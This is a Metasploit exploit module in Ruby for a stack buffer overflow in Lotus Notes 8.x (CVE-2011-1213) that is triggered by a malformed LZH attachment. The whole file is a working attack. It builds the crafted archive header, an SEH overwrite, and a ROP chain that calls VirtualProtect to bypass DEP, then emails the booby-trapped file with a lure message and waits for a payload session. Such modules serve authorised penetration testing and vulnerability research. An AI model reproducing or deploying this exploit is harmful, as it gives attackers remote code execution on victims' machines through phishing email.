##
# $Id: lotusnotes_lzh.rb 13015 2011-06-23 15:43:54Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking # needs client interaction and permanent listener

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview(.lzh attachment)',
			'Description'    => %q{
				This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when
				parsing a malformed, specially crafted LZH file. This vulnerability was
				discovered binaryhouse.net

			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'binaryhouse.net',		# original discovery
					'alino <26alino@gmail.com>',	# Metasploit module
				],
			'Version'        => '$Revision: 13015 $',
			'References'     =>
				[
					['CVE', '2011-1213'],
					['OSVDB', '72706'],
					['BID', '48018'],
					['URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=904'],
					['URL', 'http://www.ibm.com/support/docview.wss?uid=swg21500034'],
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'Lotus Notes 8.0.x - 8.5.2 FP2 / Windows Universal',
						{
							'Offset' => 6741,
							'Ret'    => 0x780c26b2 # POP ECX; POP ECX; RETN MSVCP60.dll
						}
					],
					
					[ 'Lotus Notes 8.5.2 FP2 / Windows Universal / DEP',
						{
							'Offset' => 6745,
							'Ret'    => 0x60dc1043 # ADD ESP,52C; XOR EAX,EAX; POP EDI; POP ESI; POP EBX; POP EBP; RETN 4 nnotes.dll
						}
					],
				],
			'DisclosureDate' => 'May 24 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				#
				# Email options
				#
				OptString.new('FILENAME',
					[false, 'Sets the attachment file name', 'data.lzh']),
				OptString.new('MESSAGE',
					[false, 'Email message text', 'Important message, please view attachment!'])
			], self.class)
		register_advanced_options(
			[
				OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ]),
				OptInt.new("ListenerTimeout", [ false, "The maximum number of seconds to wait for new sessions", 0])
			], self.class)
	end

	def exploit

		header =  "\x08"		# Size of archived file header <-- 8 - 13 = FFFFFFF6
		header << "\x1a"		# 1 byte Header checksum
		header << "-lh0-"		# Method ID (No compression)
		header << "\x7c\x1a\x00\x00"	# Compressed file size
		header << "\x7c\x1a\x00\x00"	# Uncompressed file size
		header << "\xB2\x5e\xab\x3c"	# Original file date/time
		header << "\x20"		# File attribute
		header << "\x00"		# Level identifier
		header << "\x07"		# File name length
		header << "poc.txt"		# File name
		header << "\x25\x7d"		# 16 bit CRC of the uncompressed file

		lzh =  header 
		lzh << rand_text(target['Offset'])

		if (target == targets[0])

			lzh << generate_seh_record(target.ret)
			lzh << make_nops(8)
			lzh << payload.encoded

		elsif (target == targets[1])

			rop_nop = [0x7c3c5958].pack('V') * 47 # RETN MSVCP71.dll

			rop_gadgets =
			[
				0x60524404, # POP EAX; RETN nnotes.dll
				0x7c37a140, # VirtualProtect() 
				0x7c3a4000, # MOV EAX,DWORD PTR DS:[EAX]; RETN MSVCP71.dll
				0x603c53c1, # MOV ESI,EAX; RETN nnotes.dll
				0x60620001, # POP EBP; RETN nnotes.dll
				0x7c3c5946, # PUSH ESP; RETN MSVCP71.dll
				0x7c34280f, # POP EBX; RETN MSVCR71.dll
				0x00001954, # dwSize
				0x780ea001, # POP ECX; RETN MSVCP60.dll
				0x7c38b000, # lpflOldProtect
				0x60e73200, # POP EDI; RETN nnotes.dll
				0x60e73201, # RETN nnotes.dll
				0x601d5f02, # POP EDX; RETN nnotes.dll
				0x00000040, # flNewProtect
				0x60524404, # POP EAX; RETN nnotes.dll
				0x90909090, # NOP
				0x60820801, # PUSHAD; RETN nnotes.dll
			].pack("V*")

			lzh << [target.ret].pack('V')
			lzh[32, rop_nop.length] = rop_nop
			lzh[220, rop_gadgets.length] = rop_gadgets
			lzh[289, payload.encoded.length] = payload.encoded
		end

		name = datastore['FILENAME'] || Rex::Text.rand_text_alpha(rand(10)+1) + ".lzh"
		data = datastore['MESSAGE'] || Rex::Text.rand_text_alpha(rand(32)+1)

		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(Rex::Text.encode_base64(data, "\r\n"), "text/plain", "base64", "inline")
		msg.add_part_attachment(lzh, name)

		send_message(msg.to_s)

		print_status("Waiting for a payload session (backgrounding)...")

		if not datastore['ExitOnSession'] and not job_id
			raise RuntimeError, "Setting ExitOnSession to false requires running as a job (exploit -j)"
		end

		stime = Time.now.to_f
		print_status "Starting the payload handler..."
		while(true)
			break if session_created? and datastore['ExitOnSession']
			break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )

			select(nil,nil,nil,1)
		end
	end
end